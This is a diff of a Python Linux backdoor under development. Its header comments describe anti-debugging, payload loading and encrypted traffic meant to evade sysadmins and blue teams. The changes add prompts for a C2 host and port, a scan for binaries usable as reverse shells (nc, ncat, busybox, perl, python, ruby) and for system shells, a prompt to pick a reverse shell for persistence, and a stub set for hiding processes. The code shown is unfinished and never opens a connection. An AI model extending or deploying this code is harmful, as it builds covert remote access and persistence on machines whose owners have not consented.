@@ -4,7 +4,6 @@
 # analyzes processes running debugger and thus terminates the backdoor, allows external payload or the backdoor itself so the attacker has more options to use, not only depending on the payload created by the backdoor,
 #after that it encrypts the communication in order to avoid discoveries in the network by sysadmin,blue team. in the future I will implement new features, such as porting to golang.
 
-
 import os
 import sys
 from urllib.request import urlretrieve
@@ -36,14 +35,31 @@ def check_debugger_linux():
 def internal_backdoor_linux():
 
     print("[!] BACKDOOR IS INTERNAL")
-    LHOST = input("[$] SET LHOST => ")
-    LPORT = input("[$] SET LPORT => ")
+    LHOST = input("[$] SET YOUR C2 LHOST => ")
+    LPORT = input("[$] SET YOUR C2 LPORT => ")
 
-    print(f"[@] YOUR LHOST {LHOST}:{LPORT} IMPLEMENTED PERSISTENCE...")
+    print(f"[@] YOUR C2 {LHOST}:{LPORT}, IMPLEMENTED PERSISTENCE...")
     reverse_shell_binary = {'/usr/bin/busybox', '/usr/local/bin/busybox', '/bin/busybox', '/usr/bin/nc', '/usr/local/bin/nc', '/bin/nc', '/usr/bin/ncat', '/usr/local/bin/ncat', '/bin/ncat', '/usr/bin/perl', '/usr/local/bin/perl', '/bin/perl', '/usr/bin/python', '/usr/local/bin/python', '/bin/python', '/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3', '/usr/bin/ruby', '/usr/local/bin/ruby', '/bin/ruby'}
+    print("------------------------------------------------")
+
     for reverse in reverse_shell_binary:
-        if os.path.exists(reverse):
+        binary_exist = os.path.exists(reverse)
+        if binary_exist:
             print(f"[#] FOUND BINARY TO REVERSE SHELL: {reverse}")
+    print("------------------------------------------------")
+    shell = {'/bin/bash','/bin/sh'}
+    print("------------------------------------------------")
+
+    for shell_1337 in shell:
+        if os.path.exists(shell_1337):
+            print(f"[@] SHELL IN MACHINE TARGET => {shell_1337}")
+    print("-------------------------------------------------")
+
+    choice_reverse_shell = input("[1337] Choice a Reverse Shell For Persistence Name! (example: busybox) => ")
+    hide_process = {'/usr/bin/mount', '/usr/bin/mount'}
+
+
+
 
 
 def external_backdoor_linux():
@@ -72,9 +88,6 @@ def external_backdoor_linux():
             print(f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
     else:
         print("[!] ?????? TRY AGAIN -> surface or local")
-
-
-
 
 
 
